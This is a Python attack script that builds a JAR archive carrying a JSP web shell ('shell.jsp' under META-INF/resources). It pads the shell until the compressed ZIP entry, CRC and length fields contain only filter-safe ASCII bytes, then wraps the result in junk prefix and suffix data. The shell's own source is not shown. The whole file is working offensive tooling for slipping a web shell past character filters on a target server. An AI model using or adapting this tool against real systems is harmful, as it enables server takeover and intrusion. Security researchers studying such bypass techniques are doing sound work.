#!/usr/bin/env python
# autor: c0ny1,diggid
# date 2022-02-13
from __future__ import print_function

import time
from compress import *
import os

allow_bytes = []
disallowed_bytes = [38,60,39,62,34,40,41] # &<'>"()
for b in range(0,128): # ASCII
    if b in disallowed_bytes:
        continue
    allow_bytes.append(b)


if __name__ == '__main__':
    padding_char = 'A'
    raw_filename = 'shell.jsp'
    zip_entity_filename = 'META-INF/resources/shell.jsp'
    num = 1
    tmpCode = open("eviljsp/" + raw_filename, "r").read()
    while True:
        jar_dst = "eviljsp-jar/" + str(num) + "-" + raw_filename.replace(".jsp", ".jar")
        # step1 动态生成java代码并编译
        padding_data = padding_char * num
        javaCode = tmpCode.replace("{PADDING_DATA}", padding_data)

        # step02 计算压缩之后的各个部分是否在允许的ASCII范围
        raw_data = bytearray(javaCode.encode())
        compressor = ASCIICompressor(bytearray(allow_bytes))
        compressed_data = compressor.compress(raw_data)[0]
        crc = zlib.crc32(raw_data) % pow(2, 32)

        st_crc = struct.pack('<L', crc)
        st_raw_data = struct.pack('<L', len(raw_data) % pow(2, 32))
        st_compressed_data = struct.pack('<L', len(compressed_data) % pow(2, 32))
        st_cdzf = struct.pack('<L', len(compressed_data) + len(zip_entity_filename) + 0x1e)


        b_crc = isAllowBytes(st_crc, allow_bytes)
        b_raw_data = isAllowBytes(st_raw_data, allow_bytes)
        b_compressed_data = isAllowBytes(st_compressed_data, allow_bytes)
        b_cdzf = isAllowBytes(st_cdzf, allow_bytes)

        # step03 判断各个部分是否符在允许字节范围
        if b_crc and b_raw_data and b_compressed_data and b_cdzf:
            print('[+] CRC:{0} RDL:{1} CDL:{2} CDAFL:{3} Padding data: {4}*{5}'.format(b_crc, b_raw_data, b_compressed_data, b_cdzf, num, padding_char))

            with open("tmp.jar", "wb") as f:
                data = wrap_jar(raw_data,compressed_data, zip_entity_filename.encode())
                f.write(data)
                
            time.sleep(0.1)

            # step04 判断padding后的jar是否满足ascii
            prefix = """DIRTY DATA AT THE BEGINNING """
            suffix = """diggid DIRTY DATA AT THE END"""
            os.system(f'''python3 paddingzip.py -i tmp.jar -o {jar_dst} -p "{prefix}" -a "{suffix}"''')
            time.sleep(0.1)

            final_data = open(jar_dst, "rb").read()
            print(final_data)
            b_final = isAllowBytes(final_data, allow_bytes)

            # step05 满足ascii则exit
            if b_final:
                print('[+] Generate {0} success'.format(jar_dst))
                break
            else:
                print('[-] Padding Error!!!')
                os.remove(jar_dst)
                print('[-] CRC:{0} RDL:{1} CDL:{2} CDAFL:{3} Padding data: {4}*{5}'.format(b_crc, b_raw_data,
                                                                                       b_compressed_data, b_cdzf, num,
                                                                                       padding_char)) 
        else:
            print('[-] CRC:{0} RDL:{1} CDL:{2} CDAFL:{3} Padding data: {4}*{5}'.format(b_crc, b_raw_data,
                                                                                       b_compressed_data, b_cdzf, num,
                                                                                       padding_char))
        num = num + 1
